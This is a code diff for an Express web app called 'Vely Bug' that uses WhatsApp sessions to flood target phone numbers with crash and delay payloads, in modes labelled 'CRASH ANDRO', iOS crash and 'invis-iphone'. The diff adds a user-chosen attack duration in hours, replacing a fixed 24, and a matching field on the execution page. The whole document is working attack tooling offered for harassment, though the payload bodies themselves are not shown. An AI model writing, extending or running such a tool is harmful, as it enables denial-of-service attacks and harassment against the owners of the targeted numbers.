@@ -762,6 +762,7 @@ app.get("/execution", async (req, res) => {
 
     const targetNumber = req.query.target;
     const mode = req.query.mode;
+    const duration = req.query.duration || 24;
     const target = `${targetNumber}@s.whatsapp.net`;
 
     if (sessions.size === 0) {
@@ -799,13 +800,13 @@ app.get("/execution", async (req, res) => {
 // sesuaiin aja ama pemanggilan func tadi / combo
     try {
       if (mode === "andros") {
-        androcrash(24, target);
+        androcrash(duration, target);
       } else if (mode === "ios") {
-        Ipongcrash(24, target);
+        Ipongcrash(duration, target);
       } else if (mode === "andros-delay") {
-        androdelay(24, target);
+        androdelay(duration, target);
       } else if (mode === "invis-iphone") {
-        Iponginvis(24, target);
+        Iponginvis(duration, target);
       } else {
         throw new Error("Mode tidak dikenal.");
       }
@@ -847,8 +848,8 @@ module.exports = {
 
 
 // ====== TEMPAT PEMANGGILAN FUNC & COMBO =====\\
-async function androdelay(durationHours, target) {
-  const totalDurationMs = durationHours * 3600000;
+async function androdelay(duration, target) {
+  const totalDurationMs = duration * 3600000;
   const startTime = Date.now();
   let count = 0;
   let batch = 1;
@@ -891,8 +892,8 @@ async function androdelay(durationHours, target) {
   sendNext();
 }
 
-async function androcrash(durationHours, target) {
-  const totalDurationMs = durationHours * 3600000;
+async function androcrash(duration, target) {
+  const totalDurationMs = duration * 3600000;
   const startTime = Date.now();
   let count = 0;
   let batch = 1;
@@ -936,8 +937,8 @@ async function androcrash(durationHours, target) {
   sendNext();
 }
 
-async function Ipongcrash(durationHours, target) {
-  const totalDurationMs = durationHours * 3600000;
+async function Ipongcrash(duration, target) {
+  const totalDurationMs = duration * 3600000;
   const startTime = Date.now();
   let count = 0;
   let batch = 1;
@@ -983,8 +984,8 @@ async function Ipongcrash(durationHours, target) {
   sendNext();
 }
 
-async function Iponginvis(durationHours, target) {
-  const totalDurationMs = durationHours * 3600000;
+async function Iponginvis(duration, target) {
+  const totalDurationMs = duration * 3600000;
   const startTime = Date.now();
   let count = 0;
   let batch = 1;
@@ -1268,7 +1269,8 @@ const executionPage = (
     <div class="title">Vely Bug</div>
     <div class="subtitle">Choose mode & target number</div>
 
-    <input type="text" placeholder="Please Input Target Number 628xx" />
+    <input type="text" id="targetNumber" placeholder="Please Input Target Number 628xx" />
+    <input type="number" id="duration" placeholder="Duration in hours (e.g., 1)" value="1" />
 
     <div class="buttons-grid">
       <button class="mode-btn" data-mode="andros"><i class="fas fa-skull-crossbones"></i> CRASH ANDRO</button>
@@ -1315,7 +1317,8 @@ const executionPage = (
     });
 
     executeBtn.addEventListener('click', () => {
-      const number = inputField.value.trim();
+      const number = document.getElementById('targetNumber').value.trim();
+      const duration = document.getElementById('duration').value.trim();
       if (!isValidNumber(number)) {
         alert("Nomor tidak valid. Harus dimulai dengan 62 dan total 10-15 digit.");
         return;
@@ -1325,7 +1328,7 @@ const executionPage = (
       setTimeout(() => { popup.style.display = "none"; }, 2000);
 
       // Arahkan ke link eksekusi
-      window.location.href = '/execution?mode=' + selectedMode + '&target=' + number;
+      window.location.href = '/execution?mode=' + selectedMode + '&target=' + number + '&duration=' + duration;
     });
   </script>
 </body>
